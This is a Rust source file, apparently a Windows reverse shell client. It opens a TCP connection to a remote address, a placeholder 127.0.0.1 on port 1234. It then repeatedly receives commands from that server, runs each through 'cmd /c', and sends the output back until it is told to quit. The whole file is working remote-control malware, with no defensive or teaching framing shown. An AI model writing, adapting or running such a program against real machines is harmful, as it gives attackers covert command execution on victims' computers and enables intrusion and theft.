use std::process::Command;
use std::{
    io::{Read, Write},
    net::*,
};

fn cmdexecute(arguments: Vec<&str>) -> String {
    let cmd = Command::new("cmd")
        .args(arguments)
        .output()
        .expect("failed to execute");

    if cmd.stdout.len() > 0 {
        //println!("{}",String::from_utf8_lossy( &cmd.stdout));
        return String::from_utf8_lossy(&cmd.stdout).to_string();
    } else {
        return String::from_utf8_lossy(&cmd.stderr).to_string();
    }
}

fn main() {
    let remoteip = "127.0.0.1".parse::<Ipv4Addr>().unwrap();
    let remoteport = 1234;

    let remotesocketaddr = SocketAddrV4::new(remoteip, remoteport);

    if let Ok(mut clientsocket) = TcpStream::connect(remotesocketaddr) {
        println!(
            "[+] Connected successfully to [{}:{}]",
            remoteip.to_string(),
            remoteport
        );



        // we, client sends first message to server
        //let mut buffer: Vec<u8> = "Hi hello there\0".bytes().collect::<Vec<u8>>();
        //clientsocket.write_all(&mut buffer);

        'clientloop: loop {
            // receiving the message or command from server
            let mut buffer: Vec<u8> = vec![0; 4096];
            clientsocket.read(&mut buffer);

            let cmdinput = String::from_utf8_lossy(&buffer)
                .to_string()
                .trim_end_matches("\0")
                .to_string();
            println!("sever sent: {:?}",cmdinput);

            if cmdinput == "quit" {
                clientsocket.write(&"quit".to_string().bytes().collect::<Vec<u8>>());
                break 'clientloop;
            }

            let cmd = "/c ".to_string() + &(cmdinput);
            let command1 = cmd.split(" ").collect::<Vec<&str>>();
            let output = cmdexecute(command1);

            println!("sent to server: {}",output);
            clientsocket.write(&mut output.bytes().collect::<Vec<u8>>());
        }

        clientsocket.shutdown(Shutdown::Both);
    } else {
        println!("could not connect to the server");
    }
}
